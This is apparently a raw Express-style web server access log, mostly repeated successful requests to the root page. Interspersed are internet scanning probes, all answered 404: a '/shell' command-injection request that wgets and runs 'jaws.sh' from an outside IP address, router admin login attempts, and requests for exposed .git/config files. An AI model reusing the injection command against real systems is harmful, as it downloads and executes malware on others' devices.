Server is running on port:  \\.\pipe\c8276f64-6d78-4adc-bd2c-9bd85f6582f5
[0mGET / [32m200[0m 65.618 ms - 32382[0m
[0mGET / [32m200[0m 20.965 ms - 32382[0m
[0mGET / [32m200[0m 15.505 ms - 32382[0m
[0mGET / [32m200[0m 14.603 ms - 32382[0m
[0mGET / [32m200[0m 13.283 ms - 32382[0m
[0mGET / [32m200[0m 12.455 ms - 32382[0m
[0mGET / [32m200[0m 12.182 ms - 32382[0m
[0mGET / [32m200[0m 12.939 ms - 32382[0m
[0mGET / [32m200[0m 14.928 ms - 32382[0m
[0mGET / [32m200[0m 12.719 ms - 32382[0m
[0mGET / [32m200[0m 11.838 ms - 32382[0m
[0mGET / [32m200[0m 13.101 ms - 32382[0m
[0mGET / [32m200[0m 13.570 ms - 32382[0m
[0mGET / [32m200[0m 12.515 ms - 32382[0m
[0mGET / [32m200[0m 12.569 ms - 32382[0m
[0mGET / [32m200[0m 13.139 ms - 32382[0m
[0mGET / [32m200[0m 13.018 ms - 32382[0m
[0mGET / [32m200[0m 51.602 ms - 32382[0m
[0mGET / [32m200[0m 12.776 ms - 32382[0m
[0mGET / [32m200[0m 12.428 ms - 32382[0m
[0mGET /shell?cd+/tmp;rm+-rf+j;nohup+wget+http:/\/89.144.32.113/jaws.sh;chmod+777+jaws.sh;./jaws.sh [33m404[0m 11.107 ms - 144[0m
[0mGET / [32m200[0m 12.178 ms - 32382[0m
[0mGET / [32m200[0m 10.986 ms - 32382[0m
[0mGET / [32m200[0m 11.267 ms - 32382[0m
[0mGET / [32m200[0m 12.307 ms - 32382[0m
[0mGET / [32m200[0m 12.862 ms - 32382[0m
[0mGET / [32m200[0m 10.938 ms - 32382[0m
[0mGET / [32m200[0m 12.578 ms - 32382[0m
[0mPOST /boaform/admin/formLogin [33m404[0m 12.459 ms - 163[0m
[0mPOST /boaform/admin/formLogin [33m404[0m 4.455 ms - 163[0m
[0mGET / [32m200[0m 10.310 ms - 32382[0m
[0mGET / [32m200[0m 12.457 ms - 32382[0m
[0mGET / [32m200[0m 12.213 ms - 32382[0m
[0mGET / [32m200[0m 10.903 ms - 32382[0m
[0mGET / [32m200[0m 10.770 ms - 32382[0m
[0mGET / [32m200[0m 12.318 ms - 32382[0m
[0mGET / [32m200[0m 12.606 ms - 32382[0m
[0mGET / [32m200[0m 10.842 ms - 32382[0m
[0mGET / [32m200[0m 10.903 ms - 32382[0m
[0mGET / [32m200[0m 13.315 ms - 32382[0m
[0mGET / [32m200[0m 12.124 ms - 32382[0m
[0mGET / [32m200[0m 10.033 ms - 32382[0m
[0mGET / [32m200[0m 10.586 ms - 32382[0m
[0mGET / [32m200[0m 12.346 ms - 32382[0m
[0mGET / [32m200[0m 12.164 ms - 32382[0m
[0mGET / [32m200[0m 10.639 ms - 32382[0m
[0mGET / [32m200[0m 11.907 ms - 32382[0m
[0mGET / [32m200[0m 12.689 ms - 32382[0m
[0mGET / [32m200[0m 12.733 ms - 32382[0m
[0mGET / [32m200[0m 10.677 ms - 32382[0m
[0mGET / [32m200[0m 12.039 ms - 32382[0m
[0mGET / [32m200[0m 12.496 ms - 32382[0m
[0mGET / [32m200[0m 11.674 ms - 32382[0m
[0mGET / [32m200[0m 9.759 ms - 32382[0m
[0mGET / [32m200[0m 10.617 ms - 32382[0m
[0mGET /test/.git/config [33m404[0m 2.919 ms - 155[0m
[0mGET /www/.git/config [33m404[0m 2.881 ms - 154[0m
[0mGET / [32m200[0m 10.525 ms - 32382[0m
[0mGET / [32m200[0m 12.609 ms - 32382[0m
[0mGET / [32m200[0m 12.265 ms - 32382[0m
[0mGET / [32m200[0m 10.936 ms - 32382[0m
[0mGET / [32m200[0m 10.688 ms - 32382[0m
[0mGET / [32m200[0m 12.242 ms - 32382[0m
[0mGET /.git/config [33m404[0m 2.921 ms - 150[0m
[0mGET / [32m200[0m 12.484 ms - 32382[0m
[0mGET / [32m200[0m 12.398 ms - 32382[0m
[0mGET / [32m200[0m 10.937 ms - 32382[0m
[0mGET / [32m200[0m 9.737 ms - 32382[0m
[0mGET / [32m200[0m 12.163 ms - 32382[0m
[0mGET / [32m200[0m 12.302 ms - 32382[0m
[0mGET / [32m200[0m 10.610 ms - 32382[0m
[0mGET / [32m200[0m 12.357 ms - 32382[0m
[0mGET / [32m200[0m 12.163 ms - 32382[0m
[0mGET / [32m200[0m 11.998 ms - 32382[0m
[0mGET / [32m200[0m 10.629 ms - 32382[0m
[0mGET / [32m200[0m 12.150 ms - 32382[0m
[0mGET / [32m200[0m 12.421 ms - 32382[0m
[0mGET / [32m200[0m 11.611 ms - 32382[0m
[0mGET / [32m200[0m 10.698 ms - 32382[0m
[0mGET / [32m200[0m 10.992 ms - 32382[0m
[0mGET / [32m200[0m 11.926 ms - 32382[0m
[0mGET / [32m200[0m 12.174 ms - 32382[0m
[0mGET / [32m200[0m 11.041 ms - 32382[0m
[0mGET / [32m200[0m 11.897 ms - 32382[0m
[0mGET / [32m200[0m 12.421 ms - 32382[0m
[0mGET / [32m200[0m 12.187 ms - 32382[0m
[0mGET / [32m200[0m 11.025 ms - 32382[0m
[0mGET / [32m200[0m 12.502 ms - 32382[0m
[0mGET / [32m200[0m 12.550 ms - 32382[0m
[0mGET / [32m200[0m 11.980 ms - 32382[0m
[0mGET / [32m200[0m 10.571 ms - 32382[0m
[0mGET / [32m200[0m 11.509 ms - 32382[0m
[0mGET / [32m200[0m 12.294 ms - 32382[0m
[0mGET / [32m200[0m 12.194 ms - 32382[0m
[0mGET / [32m200[0m 10.644 ms - 32382[0m
[0mGET / [32m200[0m 11.866 ms - 32382[0m
[0mGET / [32m200[0m 12.395 ms - 32382[0m
[0mGET / [32m200[0m 12.289 ms - 32382[0m
